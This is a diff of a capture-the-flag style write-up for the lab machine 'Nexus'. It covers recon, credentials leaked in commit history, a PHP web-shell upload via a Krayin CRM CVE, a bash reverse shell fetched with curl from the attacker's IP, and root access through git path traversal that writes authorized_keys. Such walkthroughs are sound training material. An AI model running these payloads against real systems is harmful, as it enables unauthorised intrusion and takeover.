@@ -2,17 +2,26 @@
 #HTB #easy #guided-mode #reverse-shell #networks-services #CVE #authentication #burp-suite #ncat #Web #privilege-escalation #Git
 ## Target:
 *Name:* Nexus
+
 *IP:* 10.129.76.128
+
 ## Vulnerability:
+
 - Gitea commit history exposed credentials for the Krayin account, which was vulnerable to a known CVE allowing malicious PHP file upload and resulting in a reverse shell.
 - `template-sync.py`'s unsafe Git object manipulation allowed an SSH key pair to be added to root's `authorized_keys`, enabling SSH access as root.
+
 ## Steps:
+
 #### 1) Reconnaissance
+
 **Code:**
+
 ```
 nmap -sV 10.129.76.128
 ```
+
 **Result:**
+
 ```
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:12 -0400
 Nmap scan report for 10.129.76.128
@@ -26,19 +35,27 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
 ```
+
 #### 2) Investigating the web application
+
 We attempted to access the web application hosted on the machine using `http://10.129.76.128`. However, we were redirected to `http://nexus.htb`, which was inaccessible because the hostname was not resolved. We therefore added `nexus.htb` to `/etc/hosts` to resolve it to the target IP address.
+
 **Result:**
 
 <img width="2559" height="1352" alt="image" src="https://github.com/user-attachments/assets/cdbc0ae6-fa0a-415d-844b-05299529dee5" />
 
 #### 3) Virtual hosts enumeration
+
 We used `gobuster` to find available virtual hosts on the target server:
+
 **Code:**
+
 ```
 gobuster vhost -u http://nexus.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
 ```
+
 **Result:**
+
 ```
 ===============================================================
 Gobuster v3.8.2
@@ -75,13 +92,19 @@ Progress: 4613 / 4613 (100.00%)
 Finished
 ===============================================================
 ```
+
 We have 2 important findings:
 - `git.nexus.htb`: returned a status code of 200 (FOUND), indicating that the virtual host is active and accessible.
 - `billing.nexus.htb`: returned a status code of 302 (REDIRECT), redirecting to `http://billing.nexus.htb/admin/login`, which reveals an `/admin/login` endpoint.
+- 
 We'll investigate both of them.
+
 #### 4) Exploring the Git VHost
+
 After adding `git.nexus.htb` to `/etc/hosts`, we investigated the Git virtual host.
+
 Firstly, we accessed to it using the URL: `http://git.nexus.htb`.
+
 **Result:**
 
 <img width="2555" height="1300" alt="image" src="https://github.com/user-attachments/assets/85934834-d591-44fe-a642-6f73b20dc561" />
@@ -90,11 +113,15 @@ Firstly, we accessed to it using the URL: `http://git.nexus.htb`.
 > Gitea is a **self-hosted service for hosting and managing Git repositories**. It provides a web interface where users can **create, view, and manage repositories and their changes**.
 
 Second, we enumerated the `git.nexus.htb` vhost.
+
 **Code:**
+
 ```
 gobuster dir -u http://git.nexus.htb -w /usr/share/wordlists/dirb/common.txt
 ```
+
 **Result:**
+
 ```
 ===============================================================
 Gobuster v3.8.2
@@ -126,6 +153,7 @@ Finished
 
 ```
 The enumeration revealed the presence of an `admin` directory on the virtual host.
+
 We accessed to it using the browser:
 
 <img width="2551" height="877" alt="image" src="https://github.com/user-attachments/assets/428ea381-0683-49d6-b513-5b168279d595" />
@@ -135,14 +163,18 @@ While investigating the repository `krayin-docker-setup`, we found the following
 <img width="796" height="430" alt="image" src="https://github.com/user-attachments/assets/62edb714-8db0-496b-b39d-99501682b5b2" />
 
 The commit history revealed changes to the files, which led to the discovery of a password.
+
 #### 5) Exploring the billing vhost
+
 Next, we proceed to add the `billing` vhost to our hosts list, then access to it.
+
 **Screenshot:**
 
 <img width="1040" height="1027" alt="image" src="https://github.com/user-attachments/assets/98d0c62d-ea85-4f07-96e2-fdcc55d230ec" />
 
 We got redirected to Krayin login.
 We proceed to access it using the email we found earlier for the hiring manager and the password from the earlier `.env` file.
+
 **Screenshot:**
 
 <img width="2553" height="1266" alt="image" src="https://github.com/user-attachments/assets/984a2af1-109f-48a1-a575-f8bdc71e1a04" />
@@ -152,12 +184,17 @@ Next, we searched for vulnerabilities related to `Krayin` application. We found 
 CVE-2026-38526 is a critical authenticated remote code execution vulnerability affecting Webkul Krayin CRM v2.2.x. The vulnerability exists in the TinyMCE media upload endpoint `/admin/tinymce/upload`, which fails to validate uploaded file types. An authenticated attacker can upload a malicious PHP file and execute arbitrary commands on the server.
 
 **Source:** [CVE-2026-38526-PoC](https://github.com/NathanHimself/CVE-2026-38526-PoC)
+
 #### 7) Reverse Shell
+
 We exploited the `CVE-2026-38526` vulnerability by uploading a PHP file containing the following code:
+
 ```php
 <?php system($_GET["cmd"]); ?>
 ```
+
 using the following HTTP POST request:
+
 ```http
 POST /admin/tinymce/upload HTTP/1.1
 Host: billing.nexus.htb
@@ -183,7 +220,9 @@ Content-Type: image/jpeg
 <?php system($_GET["cmd"]); ?>
 ------WebKitFormBoundarygQi5PfSLhxJhdw1G
 ```
+
 **Result:**
+
 ```http
 HTTP/1.1 200 OK
 Server: nginx/1.24.0 (Ubuntu)
@@ -197,37 +236,53 @@ Content-Length: 97
 
 {"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/e3dad298e93360d2d35d709b6b488086.php"}
 ```
+
 We successfully uploaded the malicious code, giving us remote command execution through the `cmd` parameter.
+
 Next, we opened a python server, on port 1330, that will serve the following payload (`shell.sh`) to the target machine:
+
 ```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.75/8000 0>&1
 ```
+
 After that, we opened a listener on port 8000.
+
 Finally, we used the uploaded payload to initialize the reverse shell:
+
 ```
 http://billing.nexus.htb//storage//tinymce//e3dad298e93360d2d35d709b6b488086.php?cmd=curl%2010.10.14.75:1330/shell.sh%20|%20bash
 ```
+
 This will download the script on the target machine and execute it with bash
 (more explanation on [Three](./../Boxes/Three))
+
 #### 8) Investigating the target machine
+
 After obtaining a remote shell on the target machine, we were operating as the `www-data` user.
+
 We started by investigating `/etc/passwd` file, and we found the following information:
+
 ```
 jones:x:1000:1000:,,,:/home/jones:/bin/bash
 ```
+
 This indicates that the target machine has a user account with username `jones`.
 We tried to login to SSH using the username `jones`, and the password we found earlier, `N27xh!!2ucY04`, but the login failed.
+
 Next, we used `grep` to search for more passwords:
+
 **Code:**
 ```
 grep -Rni "password" /var/www 2>/dev/null
 ```
+
 **Result:**
 This revealed a database password stored in the application's `.env` file:
 ```
 /var/www/krayin/.env:21:DB_PASSWORD=<PASSWORD>
 ```
+
 With this password we successfully logged in to SSH with `jones` username:
 ```
 ┌──(_______________)-[~]
@@ -270,6 +325,7 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 jones@nexus:~$
 ```
+
 #### 9) Finding user flag
 ```
 jones@nexus:~$ ls
@@ -277,6 +333,7 @@ user.txt
 jones@nexus:~$ cat user.txt
 <USER_FLAG>
 ```
+
 #### 10) Privilege escalation
 Investigating further, we found a `systemd` timer running a template sync service every 2 minutes.
 ```
@@ -285,9 +342,12 @@ NEXT LEFT UNIT ACTIVATES
 Thu 2026-08-21 18:02:00 UTC 1min gitea-template-sync.timer gitea-template-
 sync.service
 ```
-Reading the sync script at `/etc/gitea/template-sync.py` reveals that it clones all template repositories, and syncs their file contents to `/home/git/template-staging/<owner>/<repo>/` . The critical vulnerability is in how it processes file paths from `git ls-tree`, it uses `os.path.join()` on the raw file paths without sanitizing directory traversal.
 
-Since git ls-tree outputs paths containing `..` without validation, and `os.path.join()` resolves them, we can write files anywhere the git user has access. The staging directory is at `/home/git/template-staging/<owner>/<repo>/`, so we need 5 levels of `..` to reach `/root/`. Then we can write an SSH key to `.ssh/authorized_keys` and use it to get remote access to the machine.
+Reading the sync script at `/etc/gitea/template-sync.py` reveals that it clones all template repositories, and syncs their file contents to `/home/git/template-staging/<owner>/<repo>/` . 
+The critical vulnerability is in how it processes file paths from `git ls-tree`, it uses `os.path.join()` on the raw file paths without sanitizing directory traversal.
+
+Since git ls-tree outputs paths containing `..` without validation, and `os.path.join()` resolves them, we can write files anywhere the git user has access. The staging directory is at `/home/git/template-staging/<owner>/<repo>/`, so we need 5 levels of `..` to reach `/root/`. 
+Then we can write an SSH key to `.ssh/authorized_keys` and use it to get remote access to the machine.
 
 First, we generate an SSH key pair locally for our access:
 ```
@@ -859,15 +919,18 @@ Finally, the newly created commit is pushed to the remote Git repository:
 git push -u origin main --force
 ```
 Now we can log in to the machine through SSH using our key pair:
+
 **Code:**
 ```
 ssh -i /tmp/.k root@10.129.76.128
 ```
+
 **Result:**
 ```
 root@nexus:~# 
 ```
 We can now find the root flag in the root directory:
+
 ```
 root@nexus:~# pwd
 /root
